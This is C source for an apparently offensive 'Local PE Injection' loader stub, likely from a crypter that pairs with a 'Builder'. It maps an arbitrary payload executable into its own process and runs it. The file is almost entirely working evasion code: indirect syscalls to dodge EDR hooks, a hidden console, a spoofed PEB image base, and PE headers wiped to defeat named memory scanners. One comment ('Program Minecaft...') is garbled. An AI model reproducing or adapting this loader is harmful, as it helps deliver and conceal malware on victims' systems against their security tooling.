/*
 * ==========================================================================
 *  RunPE.c – Local PE Injection (payload executed in OWN process)
 * ==========================================================================
 *
 *  Instead of Process Hollowing (which requires an external host and is
 *  prone to initialization errors), we use Local PE Injection:
 *
 *  1. NtAllocateVirtualMemory – allocate RW in OWN process
 *  2. Copy PE headers and sections
 *  3. FixImportAddressTable  – manually resolve imports
 *  4. FixBaseRelocations      – relocations (if new address != ImageBase)
 *  5. FixMemPermissions       – set correct per-section memory protection
 *  6. RtlAddFunctionTable     – register x64 SEH exceptions (CRITICAL!)
 *  7. NtFlushInstructionCache – clear instruction cache
 *  8. Direct EntryPoint call in the same process
 *
 *  OPSEC: No VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
 * ==========================================================================
 */

#include "RunPE.h"
#include "NtApi.h"
#include <winternl.h>

#define RELOC_32BIT_FIELD   3
#define RELOC_64BIT_FIELD   10

/* Fixed seed shared with Builder for export hash computation.
 * Intentionally separate from the compile-time random seed used by ApiHashing.cpp
 * (which hides the Stub's own API lookups). This seed must remain stable across
 * builds so Builder and Stub always agree on the same hash value. */
#define FIXED_DJB2_SEED     0xDEADC0DE

typedef BOOL  (WINAPI* DLLMAIN_T)(HINSTANCE, DWORD, LPVOID);
typedef VOID  (NTAPI*  TLS_CALLBACK_T)(PVOID, DWORD, PVOID);
typedef VOID  (WINAPI* EXPORT_FUNC_T)(LPCSTR);

typedef struct _BASE_RELOC_ENTRY {
    WORD Offset : 12;
    WORD Type   : 4;
} BASE_RELOC_ENTRY, *PBASE_RELOC_ENTRY;


/* CRT stubs — provided by MSVC intrinsics or the Stub's custom runtime */
extern void* __cdecl memcpy(void*, const void*, size_t);
extern void* __cdecl memset(void*, int, size_t);


static DWORD FixedDjb2A(const char* s) {
    DWORD h = FIXED_DJB2_SEED;
    int   c;
    if (!s) return 0;
    while ((c = *s++)) h = ((h << 5) + h) + c;
    return h;
}

/* Walks the export table of an already-mapped PE and returns the function address
 * whose exported name hashes to exportHash (FIXED_DJB2_SEED seed).
 * Returns NULL if no match is found or the PE has no export directory. */
static FARPROC FindExportByFixedHash(PBYTE pBase, DWORD exportHash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);

    PIMAGE_DATA_DIRECTORY pExpDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!pExpDir->Size || !pExpDir->VirtualAddress) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExp =
        (PIMAGE_EXPORT_DIRECTORY)(pBase + pExpDir->VirtualAddress);
    PDWORD pNames     = (PDWORD)(pBase + pExp->AddressOfNames);
    PDWORD pFunctions = (PDWORD)(pBase + pExp->AddressOfFunctions);
    PWORD  pOrdinals  = (PWORD)(pBase  + pExp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char* pName = (const char*)(pBase + pNames[i]);
        if (FixedDjb2A(pName) == exportHash)
            return (FARPROC)(pBase + pFunctions[pOrdinals[i]]);
    }
    return NULL;
}


/* ============================================================
 *  FixImportAddressTable
 *  
 *  Resolves PE imports relative to the allocation base address.
 *  MUST be called before running the EP.
 * ============================================================ */
static BOOL FixImportAddressTable(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
    PIMAGE_DATA_DIRECTORY pImportDir =
        &pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (!pImportDir->Size || !pImportDir->VirtualAddress)
        return TRUE; // No imports – OK

    PIMAGE_IMPORT_DESCRIPTOR pDesc =
        (PIMAGE_IMPORT_DESCRIPTOR)(pPeBase + pImportDir->VirtualAddress);

    while (pDesc->OriginalFirstThunk || pDesc->FirstThunk) {
        LPCSTR  dllName = (LPCSTR)(pPeBase + pDesc->Name);
        HMODULE hDll    = LoadLibraryA(dllName);
        if (!hDll) {
            return FALSE;
        }

        /* If OriginalFirstThunk == 0, use FirstThunk as INT */
        PIMAGE_THUNK_DATA pOrig = (PIMAGE_THUNK_DATA)(pPeBase +
            (pDesc->OriginalFirstThunk ? pDesc->OriginalFirstThunk : pDesc->FirstThunk));
        PIMAGE_THUNK_DATA pIAT  = (PIMAGE_THUNK_DATA)(pPeBase + pDesc->FirstThunk);

        while (pOrig->u1.AddressOfData) {
            FARPROC fnAddr = NULL;

            if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal)) {
                /* Import by ordinal */
                PIMAGE_NT_HEADERS pDllNt = (PIMAGE_NT_HEADERS)
                    ((PBYTE)hDll + ((PIMAGE_DOS_HEADER)hDll)->e_lfanew);
                PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)
                    ((PBYTE)hDll + pDllNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                PDWORD pFuncArr = (PDWORD)((PBYTE)hDll + pExp->AddressOfFunctions);
                WORD   ordIdx   = (WORD)IMAGE_ORDINAL(pOrig->u1.Ordinal) - (WORD)pExp->Base;
                fnAddr = (FARPROC)((PBYTE)hDll + pFuncArr[ordIdx]);
            } else {
                /* Import by name */
                PIMAGE_IMPORT_BY_NAME pByName =
                    (PIMAGE_IMPORT_BY_NAME)(pPeBase + pOrig->u1.AddressOfData);
                fnAddr = GetProcAddress(hDll, pByName->Name);
            }

            if (fnAddr) {
                pIAT->u1.Function = (ULONGLONG)fnAddr;
            } else {
                return FALSE;
            }

            pOrig++;
            pIAT++;
        }

        pDesc++;
    }

    return TRUE;
}


/* ============================================================
 *  FixBaseRelocations
 *
 *  Applies base relocations when the PE was loaded at an address
 *  different from OptionalHeader.ImageBase.
 * ============================================================ */
static BOOL FixBaseRelocations(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
    DWORD_PTR delta = (DWORD_PTR)(pPeBase - pNtHdrs->OptionalHeader.ImageBase);
    if (delta == 0) return TRUE;

    PIMAGE_DATA_DIRECTORY pRelocDir =
        &pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!pRelocDir->Size || !pRelocDir->VirtualAddress)
        return TRUE;

    PIMAGE_BASE_RELOCATION pReloc =
        (PIMAGE_BASE_RELOCATION)(pPeBase + pRelocDir->VirtualAddress);

    while (pReloc->VirtualAddress) {
        PBASE_RELOC_ENTRY pEntry =
            (PBASE_RELOC_ENTRY)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
        DWORD entryCount =
            (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (DWORD i = 0; i < entryCount; i++) {
            if (pEntry[i].Type == RELOC_64BIT_FIELD) {
                DWORD_PTR* pPatch =
                    (DWORD_PTR*)(pPeBase + pReloc->VirtualAddress + pEntry[i].Offset);
                *pPatch += delta;
            } else if (pEntry[i].Type == RELOC_32BIT_FIELD) {
                DWORD* pPatch =
                    (DWORD*)(pPeBase + pReloc->VirtualAddress + pEntry[i].Offset);
                *pPatch += (DWORD)delta;
            }
        }

        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
    }

    return TRUE;
}


/* ============================================================
 *  FixMemPermissions
 *
 *  Sets correct memory page protections per PE section.
 *  CRITICAL: .text must be RX (not RWX!) for OPSEC.
 * ============================================================ */
static BOOL FixMemPermissions(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtHdrs);

    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
        SIZE_T sSize = pSec[i].Misc.VirtualSize;
        if (sSize == 0) {
            sSize = pSec[i].SizeOfRawData;
        }

        if (sSize == 0 || !pSec[i].VirtualAddress) {
            continue;
        }

        DWORD  dwChars = pSec[i].Characteristics;
        DWORD  dwProt  = PAGE_NOACCESS;
        DWORD  dwOld   = 0;
        PVOID  pAddr   = (PVOID)(pPeBase + pSec[i].VirtualAddress);

        BOOL bR = (dwChars & IMAGE_SCN_MEM_READ)    != 0;
        BOOL bW = (dwChars & IMAGE_SCN_MEM_WRITE)   != 0;
        BOOL bX = (dwChars & IMAGE_SCN_MEM_EXECUTE) != 0;

        if (bX && bR && bW) dwProt = PAGE_EXECUTE_READWRITE;
        else if (bX && bR)  dwProt = PAGE_EXECUTE_READ;
        else if (bX)        dwProt = PAGE_EXECUTE;
        else if (bR && bW)  dwProt = PAGE_READWRITE;
        else if (bW)        dwProt = PAGE_WRITECOPY;
        else if (bR)        dwProt = PAGE_READONLY;

        /* Reverting back to indirect Syscall to avoid EDR Hooks on VirtualProtect */
        pNtProtectVirtualMemory((HANDLE)-1, &pAddr, &sSize, dwProt, &dwOld);
    }

    return TRUE;
}


/* ============================================================
 *  RunPE – main function: Local PE Injection
 * ============================================================ */
DWORD RunPE(BYTE* pPeFile, DWORD exportHash, LPCSTR pExportArg, void (*PreExecuteCb)(void)) {
    if (!pPeFile) return 101;

    /* 1. Parse headers */
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPeFile;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 102;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pPeFile + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 103;

    DWORD  sizeOfImage = pNt->OptionalHeader.SizeOfImage;
    SIZE_T allocSize   = (SIZE_T)sizeOfImage;

    /* 2. Allocate RW in OWN process */
    PBYTE  pBase = NULL;
    PVOID  pBaseVoid = NULL;
    NTSTATUS status = pNtAllocateVirtualMemory(
        (HANDLE)-1,   /* NtCurrentProcess() */
        &pBaseVoid,
        0,
        &allocSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) return (DWORD)status;
    pBase = (PBYTE)pBaseVoid;

    /* 3. Copy PE headers */
    memcpy(pBase, pPeFile, pNt->OptionalHeader.SizeOfHeaders);

    /* 4. Copy PE sections */
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            memcpy(
                pBase + pSec[i].VirtualAddress,
                pPeFile + pSec[i].PointerToRawData,
                pSec[i].SizeOfRawData
            );
        }
    }

    /* 5. Relocations (if allocation address != ImageBase) */
    FixBaseRelocations(pBase, pNt);

    /* 6. Resolve IAT */
    if (!FixImportAddressTable(pBase, pNt)) return 105;

    /* 7. Set per-section memory protection */
    FixMemPermissions(pBase, pNt);

    /* 8. Register x64 SEH exception table – CRITICAL!
     *
     *  Without RtlAddFunctionTable, Windows cannot handle exceptions
     *  (SEH/C++ exceptions) in our code and every exception = crash.
     *  Program Minecaft allows it to work for sure. 
     */
    PIMAGE_DATA_DIRECTORY pExceptDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (pExceptDir->Size && pExceptDir->VirtualAddress) {
        PIMAGE_RUNTIME_FUNCTION_ENTRY pRtFunc =
            (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pBase + pExceptDir->VirtualAddress);
        DWORD entryCount =
            (pExceptDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY));
        RtlAddFunctionTable(pRtFunc, entryCount, (DWORD64)pBase);
    }

    /* 9. NtFlushInstructionCache – flush instruction cache */
    {
        SIZE_T flushSize = (SIZE_T)sizeOfImage;
        pNtFlushInstructionCache((HANDLE)-1, pBase, flushSize);
    }

    /* WE ARE DONE WITH SYSCALLS - CLEANUP OPSEC BEFORE HANDING OVER TO PAYLOAD */
    if (PreExecuteCb) PreExecuteCb();

    /* 10. TLS Callbacks (if exist) – run them before EP */
    PIMAGE_DATA_DIRECTORY pTlsDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (pTlsDir->Size && pTlsDir->VirtualAddress) {
        PIMAGE_TLS_DIRECTORY pTls =
            (PIMAGE_TLS_DIRECTORY)(pBase + pTlsDir->VirtualAddress);
        PIMAGE_TLS_CALLBACK* ppCb = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;
        if (ppCb) {
            while (*ppCb) {
                (*ppCb)((LPVOID)pBase, DLL_PROCESS_ATTACH, NULL);
                ppCb++;
            }
        }
    }

    /* 11. Replace ImageBaseAddress in PEB so payload thinks it's the main module */
#if defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    pPeb->Reserved3[1] = pBase;

    /* 11.5. Check if payload is a Console Application (CUI) and allocate Console to satisfy its MSVC CRT routines! */
    if (pNt->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI) {
        AllocConsole();
        HWND hConsole = GetConsoleWindow();
        if (hConsole) {
            ShowWindow(hConsole, SW_HIDE); // Hide by default for OPSEC, payload can show it if needed
        }
    }

    /* 12. Wipe PE headers from the mapped image (DLL payloads only).
     *
     * Zeroing the MZ/PE headers defeats signature scans (pe-sieve, BeaconEye, Moneta)
     * that fingerprint reflectively-loaded modules by looking for "MZ" at the base.
     *
     * EXE payloads are excluded: the MSVC CRT startup reads its own PE headers via
     * PEB->ImageBaseAddress immediately after the entry point is called — it uses
     * them to locate LoadConfig (security cookie), exception tables, and other
     * metadata.  Zeroing e_lfanew collapses all DataDirectory lookups to pBase+0,
     * producing null-pointer dereferences in rpcrt4 / ntdll initialisation.
     *
     * DLL payloads are safe: DllMain does not trigger CRT startup and background
     * threads spawned from DllMain do not re-parse the DLL's own PE headers. */
    BOOL bIsDll = (pNt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
	// Cleanup moved after entrypoint execution to allow payload to read headers during initialization

    /* 13. Run EntryPoint */

    if (bIsDll) {
        /* Call DllMain only when EP is non-zero — shellcode-style DLLs often set it to 0 */
        if (pNt->OptionalHeader.AddressOfEntryPoint != 0) {
            DLLMAIN_T pDllMain = (DLLMAIN_T)(pBase + pNt->OptionalHeader.AddressOfEntryPoint);
            pDllMain((HINSTANCE)pBase, DLL_PROCESS_ATTACH, NULL);
        }

        /* Optionally invoke a named export identified by its fixed-seed Djb2 hash.
         * exportHash == 0 means no export call was requested (EXE payloads also skip this). */
        if (exportHash != 0) {
            FARPROC pExport = FindExportByFixedHash(pBase, exportHash);
            if (pExport) {
                EXPORT_FUNC_T pFunc = (EXPORT_FUNC_T)pExport;
                /* Pass the arg string if non-empty, otherwise NULL */
                LPCSTR arg = (pExportArg && *pExportArg) ? pExportArg : NULL;
                pFunc(arg);
            }
        }
    } else {
        void (*pMain)(void) = (void (*)(void))(pBase + pNt->OptionalHeader.AddressOfEntryPoint);
        pMain();
    }

	// We wipe the headers after EP execution to allow the payload to read them if needed during initialization, but remove them before 
    // any postexp activity (threads, timers, etc.) can trigger EDR scans.  
    // DLL payloads are more likely to have postex activity and are more likely to be caught by header scanners, so we wipe only DLLs. 
    // EXE payloads often need their headers for CRT startup and are less likely to be scanned by EDRs, so we leave them intact.
    if (bIsDll) {
        DWORD dwHdrSize = pNt->OptionalHeader.SizeOfHeaders;
        /* Header pages remain PAGE_READWRITE (initial NtAllocateVirtualMemory
         * protection); FixMemPermissions only covers sections (VirtualAddress > 0). */
        memset(pBase, 0, dwHdrSize);
    }

    return 0;
}
